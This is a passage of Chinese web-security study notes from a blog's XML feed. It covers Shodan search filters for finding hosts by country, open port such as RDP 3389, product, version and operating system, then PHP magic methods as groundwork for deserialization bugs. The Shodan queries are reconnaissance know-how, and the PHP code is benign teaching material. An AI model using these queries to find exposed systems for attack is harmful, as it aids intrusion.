<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">city:&quot;要搜索的城市名&quot;   注意比如商丘，就是Shangqiu</span><br></pre></td></tr></table></figure>
<p>事例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">city:“Shangqiu”</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028145036.png"></p>
<h2 id="port要搜索的端口"><a href="#port要搜索的端口" class="headerlink" title="port要搜索的端口"></a>port要搜索的端口</h2><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port:要指定的端口</span><br></pre></td></tr></table></figure>
<p>事例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">country:&quot;CN&quot;  port:3389</span><br></pre></td></tr></table></figure>
<p>解释<br>country:”CN” 是指定中国的地址<br>port:3389    指定只开的3389端口<br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028111121.png"></p>
<h2 id="product搜索所使用的软件或设备"><a href="#product搜索所使用的软件或设备" class="headerlink" title="product搜索所使用的软件或设备"></a>product搜索所使用的软件或设备</h2><p><strong>格式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">product:&quot;软件或设备名&quot;</span><br></pre></td></tr></table></figure>
<p><strong>事例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">product:&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028111615.png"><br>随便打开一个看看<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028111716.png"></p>
<p>其他事例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">product:&quot;Microsoft IIS httpd&quot;</span><br><span class="line">product:&quot;nginx&quot;</span><br><span class="line">product:&quot;Apache httpd&quot;</span><br><span class="line">product:&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<h2 id="version指定版本"><a href="#version指定版本" class="headerlink" title="version指定版本"></a>version指定版本</h2><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version:&quot;版本号&quot;</span><br></pre></td></tr></table></figure>
<p>事例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">product:&quot;MySQL&quot; version:&quot;5.1.73&quot;</span><br></pre></td></tr></table></figure>
<p>介绍<br>product:”MySQL” 搜索软件是mysql的<br>version:”5.1.73” 版本是5.1.73<br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028115355.png"><br>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028115506.png"></p>
<h2 id="hostname指定主机名或者域名"><a href="#hostname指定主机名或者域名" class="headerlink" title="hostname指定主机名或者域名"></a>hostname指定主机名或者域名</h2><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hostname:&quot;主机名或者域名&quot;</span><br></pre></td></tr></table></figure>
<p>事例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hostname:&quot;www.baidu.com&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028143534.png"><br>随便打开一个可以看见主机名叫<a href="http://www.baidu.com/">www.baidu.com</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028143704.png"></p>
<h2 id="os指定主机的操作系统"><a href="#os指定主机的操作系统" class="headerlink" title="os指定主机的操作系统"></a>os指定主机的操作系统</h2><p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os:&quot;操作系统名&quot;</span><br></pre></td></tr></table></figure>
<p>事例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os:&quot;Windows xp&quot;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028144214.png"><br>随便点一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028144256.png"></p>
<h2 id="net指定ip段查询"><a href="#net指定ip段查询" class="headerlink" title="net指定ip段查询"></a>net指定ip段查询</h2><p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net:163.181.39.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029075624.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2.序列化漏洞之魔法方法</title>
    <url>/2020/10/20/2.%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="什么是魔法方法"><a href="#什么是魔法方法" class="headerlink" title="什么是魔法方法"></a>什么是魔法方法</h2><p>PHP 将所有以 <code>__</code>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 <code>__</code>为前缀。<br>魔法方法是不显示的调用而是由某种特定的条件出发的<br>下面是官方给出来的说明和使用的魔法方法<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
<h2 id="construct魔法方法"><a href="#construct魔法方法" class="headerlink" title="__construct魔法方法"></a>__construct魔法方法</h2><p><code>__construct</code>类会在每次创建新对象时先调用此方法<br>所以非常适合在使用对象之前做一些初始化工作<br>简单理解就是<code>__construct</code>会在类里面自动执行<br>列如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//公用方法里面接受传参</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">		<span class="comment">//赋值给$url变量，可以说是初始化</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;url=$url;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span>  <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="comment">//输出被初始化的内容</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化该类的对象传参</span></span><br><span class="line">$a= <span class="keyword">new</span> Site($url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出Siteurl()函数</span></span><br><span class="line">$a-&gt;Siteurl();</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019102418.png"></p>
<h2 id="sleep-和-wakeup-魔法方法"><a href="#sleep-和-wakeup-魔法方法" class="headerlink" title="__sleep()和__wakeup()魔法方法"></a>__sleep()和__wakeup()魔法方法</h2><p><code>__sleep()</code>和<code>__wakeup()</code>其实是一样的就是被调用的函数不一样<br><code>serialize()</code>函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>,如果存在，该方法会先被调用<br><code>unserialize()</code>函数会检查类中是否存在一个魔术方法 <code>__wakeup()</code>,如果存在，该方法会先被调用</p>
<h3 id="sleep-魔法方法实咧"><a href="#sleep-魔法方法实咧" class="headerlink" title="__sleep()魔法方法实咧"></a>__sleep()魔法方法实咧</h3><p><code>serialize()</code>函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>,如果存在，该方法会先被调用,然后才执行序列化操作<br>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误</p>
<p><strong>注意</strong><br>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</p>
<p><strong>用于</strong><br>方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p>
<p><strong>实咧：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url2=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url3=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">	<span class="comment">//定义__sleep魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span>  <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//序列化时只会存储 url 不会被序列化，表示返回的属性名</span></span><br><span class="line">		<span class="keyword">return</span>  [<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site($url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出返回的属性名</span></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>结果：<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019114656.png"></p>
<p>如果我把<code>__sleep()</code>里面的内容注释掉他会返回什么<br>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url2=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url3=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">	<span class="comment">//定义__sleep魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span>  <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="comment">//echo &quot;你好&quot;;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//序列化时只会存储 url 不会被序列化，表示返回的属性名</span></span><br><span class="line">		<span class="comment">//return  [&#x27;url&#x27;];</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出返回的属性名</span></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019120106.png"></p>
<h3 id="wakeup-魔法方法实咧"><a href="#wakeup-魔法方法实咧" class="headerlink" title="__wakeup()魔法方法实咧"></a>__wakeup()魔法方法实咧</h3><p><code>unserialize()</code>才会触发<code>__wakeup()</code>魔法方法<br><code>unserialize()</code>函数会检查类中是否存在一个魔术方法 <code>__wakeup()</code>,如果存在，该方法会先被调用</p>
<p>他和<code>__sleep()</code>是一样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义__sleep魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不好&quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="keyword">echo</span> unserialize(serialize($a));</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019150424.png"></p>
<h2 id="destruct-魔法方法"><a href="#destruct-魔法方法" class="headerlink" title="__destruct()魔法方法"></a>__destruct()魔法方法</h2><p><code>__destruct()</code>这个函数在对象被销毁前会被执行<br>下面参数会用到<code>unset()</code>函数，他是删除销毁一个变量函数等等<br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//定义一个__destruct()魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;好&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除实例化该类的对象</span></span><br><span class="line"><span class="keyword">unset</span>($a);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019152519.png"></p>
<h2 id="toString-魔法方法"><a href="#toString-魔法方法" class="headerlink" title="__toString()魔法方法"></a>__toString()魔法方法</h2><p><code>__toString()</code>用于一个类被当成字符串时应怎样回应,<br>通俗简单来说就是叫一个对象用输出的函数当做字符串来输出<br><strong>注意</strong><br>此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误<br>这个通俗的来讲就是如果没有<code>__toString()</code>直接输出对象就会报错<br>列：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//定义一个__toString()魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//当做一个字符串来使用</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019160213.png"></p>
<p>如果我不用<code>__toString()</code>会怎么样下面我就测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//当做一个字符串来使用</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
<p>结果他就报错了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019160828.png"></p>
<h2 id="call-魔法方法"><a href="#call-魔法方法" class="headerlink" title="__call()魔法方法"></a>__call()魔法方法</h2><p>当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用<code>__call()</code><br>在给不可访问属性赋值时，__set() 会被调用。<br>读取不可访问属性的值时，__get() 会被调用。<br>等等</p>
<p>通俗来说就是你访问一个对象中没有的东西就会调用<code>__call()</code></p>
<p><strong>作用</strong><br>为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</p>
<p><strong><code>__call($a,$b)</code>他有两个参数，也可以不带</strong><br><code>$a</code>，就是你调用一个对象里面没有的属性的名，那么<code>$a</code>就是属性的名<br><code>$b</code>，就是你调用一个对象里面没有的属性的名，并传递参数那这个<code>$b</code>就是被传的参数,应为参数很多<code>$b</code>就是一个数组</p>
<p><strong>下面访问一个对象里面不存在的属性和方法,<code>__call()</code>就会被执行</strong><br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;   </span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果调用一个不存在的内容就会执行下面的__call方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$funName, $arguments</span>)</span>&#123;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;没有这个&quot;</span>.$funName.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;这个是你输入的猜数&quot;</span>;</span><br><span class="line">          print_r($arguments);                  </span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法   </span></span><br><span class="line">$a-&gt;run(<span class="string">&quot;aaaa&quot;</span>); </span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019165159.png"></p>
<p><strong>下面访问一个对象里面不存在的方法，<code>__call()</code>就不会被执行</strong><br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;   </span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果调用一个不存在的内容就会执行下面的__call方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$funName, $arguments</span>)</span>&#123;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;没有这个&quot;</span>.$funName.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;这个是你输入的猜数&quot;</span>;</span><br><span class="line">          print_r($arguments);                  </span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用对象中存在的方法，则__call()方法不会被调用</span></span><br><span class="line">$a-&gt;Siteurl();</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201019165555.png"></p>
<h2 id="callStatic魔法方法"><a href="#callStatic魔法方法" class="headerlink" title="__callStatic魔法方法"></a>__callStatic魔法方法</h2><p><code>__callStatic</code>方法在调用对象静态方法不存在的时候被调用</p>
<p><code>__callStatic</code>和<code>__call()</code>是一样的<br><code>__call()</code>就是一个是访问普通的类内容不存在会被调用<br><code>__callStatic</code>方法在调用对象静态方法不存在的时候被调用</p>
<p><strong>作用</strong><br>为了避免当调用的静态方法不存在时产生错误，而意外的导致程序中止，可以使用 <code>__callStatic</code> 方法来避免。</p>
<p><strong><code>__callStatic($a,$b)</code>他有两个参数，也可以不带</strong><br><code>$a</code>，就是你调用一个对象里面没有的属性的名，那么<code>$a</code>就是属性的名<br><code>$b</code>，就是你调用一个对象里面没有的属性的名，并传递参数那这个<code>$b</code>就是被传的参数,应为参数很多<code>$b</code>就是一个数组</p>
<p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;   </span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果调用一个不存在的内容就会执行下面的__callStatic方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$funName, $arguments</span>)</span>&#123;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;没有这个静态&quot;</span>.$funName.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;这个是你输入的猜数&quot;</span>;</span><br><span class="line">          print_r($arguments);                  </span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用对象中存在的方法</span></span><br><span class="line">Site::aaaa(<span class="string">&quot;ccccc&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020110026.png"></p>
<h2 id="get-魔法方法"><a href="#get-魔法方法" class="headerlink" title="__get()魔法方法"></a>__get()魔法方法</h2><p>类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 <code>__get()</code></p>
<p><strong>用于</strong><br>在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。</p>
<p><strong><code>__get($a)</code>他有一个参数</strong><br><code>$a</code> 参数传入你要获取的成员属性的名称，返回获取的属性值</p>
<p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//私有属性</span></span><br><span class="line">	<span class="keyword">private</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;   </span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果调用一个private的属性就会执行下面的__get方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$arguments</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;没有这个&quot;</span>.$arguments;</span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问一个私有属性</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020151608.png"></p>
<h2 id="set魔法方法"><a href="#set魔法方法" class="headerlink" title="__set魔法方法"></a>__set魔法方法</h2><p>在类外赋值一个类内的私有属性和给一个未定义的属性赋值时，此方法会被触发<br>简单来说就是你放一个私有的或者给他赋值或者没有这个属性，此方法会被触发</p>
<p><strong><code>__set($a,$b)</code>他有两个参数，也可以不带</strong><br><code>$a</code>，就是你调用一个对象里面没有的属性的名，那么<code>$a</code>就是属性的名<br><code>$b</code>，就是你调用一个对象里面没有的属性的名，并传递参数那这个<code>$b</code>就是被传的参数,应为参数很多<code>$b</code>就是一个数组</p>
<p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//私有属性</span></span><br><span class="line">	<span class="keyword">private</span> $url=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Siteurl</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	&#125;   </span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果赋值一个private访问不了就会执行下面的__get方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span>  <span class="title">__set</span>(<span class="params">$funName,$arguments</span>)</span>&#123;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;你没有或不能访问&quot;</span>.$funName;</span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">&quot;不赋值&quot;</span>.$arguments;</span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给一个私有属性赋值</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url=<span class="string">&quot;aaaaa&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020153624.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>序列化漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2.手动挖掘漏洞命令执行</title>
    <url>/2019/09/16/2.%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务086：手动漏洞挖掘（二）</p>
<p>这个是我的看的教程的笔记。<br>里面是我自己实验的照片。</p>
